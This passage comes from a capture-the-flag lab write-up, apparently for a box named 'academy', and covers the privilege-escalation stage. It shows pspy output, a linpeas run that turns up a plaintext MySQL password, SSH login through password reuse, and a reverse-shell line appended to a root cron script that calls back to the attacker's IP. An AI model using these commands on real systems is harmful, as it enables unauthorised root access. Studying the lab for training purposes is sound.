2022/08/18 06:46:42 CMD: UID=0    PID=362    | /sbin/dhclient -4 -v -i -pf /run/dhclient.enp0s3.pid -lf /var/lib/dhcp/dhclient.enp0s3.leases -I -df /var/lib/dhcp/dhclient6.enp0s3.leases enp0s3 
2022/08/18 06:46:42 CMD: UID=0    PID=361    | /usr/sbin/rsyslogd -n -iNONE 
2022/08/18 06:46:42 CMD: UID=0    PID=360    | /usr/sbin/cron -f 
2022/08/18 06:46:42 CMD: UID=33   PID=3122   | ./pspy64 
2022/08/18 06:46:42 CMD: UID=0    PID=3119   | 
2022/08/18 06:46:42 CMD: UID=0    PID=3076   | 
2022/08/18 06:46:42 CMD: UID=101  PID=306    | /lib/systemd/systemd-timesyncd 
2022/08/18 06:46:42 CMD: UID=0    PID=30     | 
2022/08/18 06:46:42 CMD: UID=0    PID=3      | 
2022/08/18 06:46:42 CMD: UID=0    PID=29     | 
2022/08/18 06:46:42 CMD: UID=0    PID=284    | 
2022/08/18 06:46:42 CMD: UID=0    PID=283    | 
2022/08/18 06:46:42 CMD: UID=0    PID=28     | 
2022/08/18 06:46:42 CMD: UID=0    PID=27     | 
2022/08/18 06:46:42 CMD: UID=0    PID=26     | 
2022/08/18 06:46:42 CMD: UID=33   PID=2524   | /bin/bash 
2022/08/18 06:46:42 CMD: UID=33   PID=2523   | python -c import pty;pty.spawn("/bin/bash") 
2022/08/18 06:46:42 CMD: UID=0    PID=25     | 
2022/08/18 06:46:42 CMD: UID=33   PID=2418   | /bin/sh -i 
2022/08/18 06:46:42 CMD: UID=33   PID=2414   | sh -c uname -a; w; id; /bin/sh -i 
2022/08/18 06:46:42 CMD: UID=0    PID=24     | 
2022/08/18 06:46:42 CMD: UID=0    PID=236    | /lib/systemd/systemd-udevd 
2022/08/18 06:46:42 CMD: UID=0    PID=23     | 
2022/08/18 06:46:42 CMD: UID=0    PID=22     | 
2022/08/18 06:46:42 CMD: UID=0    PID=219    | /lib/systemd/systemd-journald 
2022/08/18 06:46:42 CMD: UID=0    PID=21     | 
2022/08/18 06:46:42 CMD: UID=0    PID=20     | 
2022/08/18 06:46:42 CMD: UID=0    PID=2      | 
2022/08/18 06:46:42 CMD: UID=0    PID=19     | 
2022/08/18 06:46:42 CMD: UID=0    PID=187    | 
2022/08/18 06:46:42 CMD: UID=0    PID=186    | 
2022/08/18 06:46:42 CMD: UID=0    PID=184    | 
2022/08/18 06:46:42 CMD: UID=0    PID=18     | 
2022/08/18 06:46:42 CMD: UID=0    PID=17     | 
2022/08/18 06:46:42 CMD: UID=33   PID=1647   | /usr/sbin/apache2 -k start 
2022/08/18 06:46:42 CMD: UID=33   PID=1646   | /usr/sbin/apache2 -k start 
2022/08/18 06:46:42 CMD: UID=33   PID=1645   | /usr/sbin/apache2 -k start 
2022/08/18 06:46:42 CMD: UID=33   PID=1643   | /usr/sbin/apache2 -k start 
2022/08/18 06:46:42 CMD: UID=0    PID=16     | 
2022/08/18 06:46:42 CMD: UID=33   PID=1575   | /usr/sbin/apache2 -k start 
2022/08/18 06:46:42 CMD: UID=33   PID=1561   | /usr/sbin/apache2 -k start 
2022/08/18 06:46:42 CMD: UID=33   PID=1557   | /usr/sbin/apache2 -k start 
2022/08/18 06:46:42 CMD: UID=0    PID=153    | 
2022/08/18 06:46:42 CMD: UID=0    PID=15     | 
2022/08/18 06:46:42 CMD: UID=33   PID=1482   | /usr/sbin/apache2 -k start 
2022/08/18 06:46:42 CMD: UID=0    PID=14     | 
2022/08/18 06:46:42 CMD: UID=0    PID=12     | 
2022/08/18 06:46:42 CMD: UID=0    PID=114    | 
2022/08/18 06:46:42 CMD: UID=0    PID=113    | 
2022/08/18 06:46:42 CMD: UID=0    PID=111    | 
2022/08/18 06:46:42 CMD: UID=0    PID=110    | 
2022/08/18 06:46:42 CMD: UID=0    PID=11     | 
2022/08/18 06:46:42 CMD: UID=0    PID=109    | 
2022/08/18 06:46:42 CMD: UID=0    PID=108    | 
2022/08/18 06:46:42 CMD: UID=0    PID=106    | 
2022/08/18 06:46:42 CMD: UID=0    PID=104    | 
2022/08/18 06:46:42 CMD: UID=0    PID=10     | 
2022/08/18 06:46:42 CMD: UID=0    PID=1      | /sbin/init 
2022/08/18 06:46:47 CMD: UID=0    PID=3129   | /sbin/dhclient -4 -v -i -pf /run/dhclient.enp0s3.pid -lf /var/lib/dhcp/dhclient.enp0s3.leases -I -df /var/lib/dhcp/dhclient6.enp0s3.leases enp0s3 
2022/08/18 06:46:47 CMD: UID=0    PID=3130   | /bin/sh /sbin/dhclient-script 
2022/08/18 06:46:47 CMD: UID=0    PID=3131   | ip -4 addr change 192.168.138.5/255.255.255.0 broadcast 192.168.138.255 valid_lft 600 preferred_lft 600 dev enp0s3 label enp0s3 
2022/08/18 06:46:48 CMD: UID=0    PID=3132   | /bin/sh /sbin/dhclient-script 
2022/08/18 06:46:48 CMD: UID=0    PID=3133   | /bin/sh /sbin/dhclient-script 
2022/08/18 06:46:48 CMD: UID=0    PID=3134   | /bin/sh /sbin/dhclient-script 
2022/08/18 06:46:48 CMD: UID=0    PID=3135   | /bin/sh /sbin/dhclient-script 
2022/08/18 06:46:48 CMD: UID=0    PID=3136   | /bin/sh /sbin/dhclient-script 
2022/08/18 06:46:48 CMD: UID=0    PID=3137   | 
2022/08/18 06:47:01 CMD: UID=0    PID=3139   | /usr/sbin/CRON -f 
2022/08/18 06:47:01 CMD: UID=0    PID=3140   | /usr/sbin/CRON -f 
2022/08/18 06:47:01 CMD: UID=0    PID=3141   | /bin/sh -c /home/grimmie/backup.sh 
2022/08/18 06:47:01 CMD: UID=0    PID=3142   | /bin/bash /home/grimmie/backup.sh 
2022/08/18 06:47:01 CMD: UID=0    PID=3143   | /bin/bash /home/grimmie/backup.sh 
2022/08/18 06:47:01 CMD: UID=0    PID=3144   | /bin/bash /home/grimmie/backup.sh 
2022/08/18 06:48:01 CMD: UID=0    PID=3145   | /usr/sbin/CRON -f 
2022/08/18 06:48:01 CMD: UID=0    PID=3146   | /usr/sbin/CRON -f 
2022/08/18 06:48:01 CMD: UID=0    PID=3147   | /bin/sh -c /home/grimmie/backup.sh 
2022/08/18 06:48:01 CMD: UID=0    PID=3148   | /bin/bash /home/grimmie/backup.sh 
2022/08/18 06:48:01 CMD: UID=0    PID=3149   | /bin/bash /home/grimmie/backup.sh 
2022/08/18 06:48:01 CMD: UID=0    PID=3150   | /bin/bash /home/grimmie/backup.sh 
^C
~~~
PSPY gathered multiple processes and hile checking them I noticed *PID=3141* executing the following: **/bin/sh -c /home/grimmie/backup.sh** executed by UID=0.
This proofs that my thoughts where correct and I should find a way to change this file with a command that makes a connection to my listener.
I stopped my shell with the **CTRL + C** key combo to stop pspy. This brings me back to starting a reverse shell again.
~~~
┌──(emvee㉿kali)-[~]
└─$ nc -lvp 1234
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 192.168.138.5.
Ncat: Connection from 192.168.138.5:35008.
Linux academy 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64 GNU/Linux
 06:56:31 up  3:53,  0 users,  load average: 0.00, 0.02, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ python -c 'import pty;pty.spawn("/bin/bash")'
www-data@academy:/$ 
~~~

After establishing a reverse shell again I started the python webserver on my machine.
~~~
┌──(emvee㉿kali)-[~/transfer]
└─$ sudo python3 -m http.server 80
[sudo] password for emvee: 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
~~~
After starting the webserver, I had to change the working directory to **/tmp** again and download **linpeas.sh** to the target and set the permission to executable.
~~~
www-data@academy:/tmp$ wget http://192.168.138.4/linpeas.sh
wget http://192.168.138.4/linpeas.sh
--2022-08-18 07:48:12--  http://192.168.138.4/linpeas.sh
Connecting to 192.168.138.4:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 807167 (788K) [text/x-sh]
Saving to: 'linpeas.sh'

linpeas.sh          100%[===================>] 788.25K  --.-KB/s    in 0.004s  

2022-08-18 07:48:12 (176 MB/s) - 'linpeas.sh' saved [807167/807167]

www-data@academy:/tmp$ chmod +x linpeas.sh
chmod +x linpeas.sh
~~~

Yes, time to run **linpeas** on the target to gather some information.

~~~
www-data@academy:/tmp$ ./linpeas.sh
./linpeas.sh


                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀

    /---------------------------------------------------------------------------------\
    |                             Do you like PEASS?                                  |                                                                                                                                                     
    |---------------------------------------------------------------------------------|                                                                                                                                                     
    |         Get the latest version    :     https://github.com/sponsors/carlospolop |                                                                                                                                                     
    |         Follow on Twitter         :     @carlospolopm                           |                                                                                                                                                     
    |         Respect on HTB            :     SirBroccoli                             |                                                                                                                                                     
    |---------------------------------------------------------------------------------|                                                                                                                                                     
    |                                 Thank you!                                      |                                                                                                                                                     
    \---------------------------------------------------------------------------------/                                                                                                                                                     
          linpeas-ng by carlospolop        


<---- SNIP ---->


╔══════════╣ Searching passwords in config PHP files
$cfg['Servers'][$i]['AllowNoPassword'] = false;                                                                                                                                                                                             
$cfg['Servers'][$i]['AllowNoPassword'] = false;
$cfg['Servers'][$i]['AllowNoPassword'] = false;
$cfg['ShowChgPassword'] = true;
$mysql_password = "My_V3ryS3cur3_P4ss";
$mysql_password = "My_V3ryS3cur3_P4ss";
~~~
Linpeas has found a password for mysql. Perhaps this password is reused by a user and can we try to connect via SSH to the target.
In previous steps the user "grimmie" has been identified, so I decided to try to logon to the SSH service with these credentials.

~~~
┌──(emvee㉿kali)-[~/Documents/academy]
└─$ ssh grimmie@$ip                                        
grimmie@192.168.138.5's password: 
Linux academy 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun May 30 03:21:39 2021 from 192.168.10.31
grimmie@academy:~$ whoami;id;hostname;pwd
grimmie
uid=1000(grimmie) gid=1000(administrator) groups=1000(administrator),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
academy
/home/grimmie
grimmie@academy:~$ 
~~~
Login with grimmie was successful by reusing the password. After that I run a couple of commands in one line to see which user, memberships and machine I'm working on using the following one-liner: **whoami;id;hostname;pwd**.
It looks like I am working in the home diretory of the user grimmie. This is where the backup.sh file should be present. I had to double check this ofcourse.
~~~
grimmie@academy:~$ ls
backup.sh
grimmie@academy:~$ cat backup.sh 
#!/bin/bash

rm /tmp/backup.zip
zip -r /tmp/backup.zip /var/www/html/academy/includes
chmod 700 /tmp/backup.zip
~~~
The file was indeed present and now it was time to adjust the content with my command to start a reverse shell to my netcat listener with the following command: **echo "sh -i >& /dev/tcp/192.168.138.4/4321 0>&1" >> backup.sh**.
~~~
grimmie@academy:~$ echo "sh -i >& /dev/tcp/192.168.138.4/4321 0>&1" >> backup.sh
~~~
After appending the backup.sh file I started my netcat listener on port 4321 and I had to wait a few minutes.
~~~
┌──(emvee㉿kali)-[~]
└─$ nc -lvp 4321
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4321
Ncat: Listening on 0.0.0.0:4321
Ncat: Connection from 192.168.138.5.
Ncat: Connection from 192.168.138.5:54038.
sh: 0: can't access tty; job control turned off
# pwd
/root
~~~
After the connection was established I entered the command: **pwd** to print the current working directory. It was the home directory of the root, so probably the flag should be here as well.
To see what files are present in the directory I use the list command **ls**.
~~~
# ls
flag.txt
~~~
There is one file present, the root flag. So I'm almost there, I just have to cat the flag by entering **cat flag.txt** 
~~~
# cat flag.txt
Congratz you rooted this box !
Looks like this CMS isn't so secure...
I hope you enjoyed it.
If you had any issue please let us know in the course discord.

Happy hacking !
# 
~~~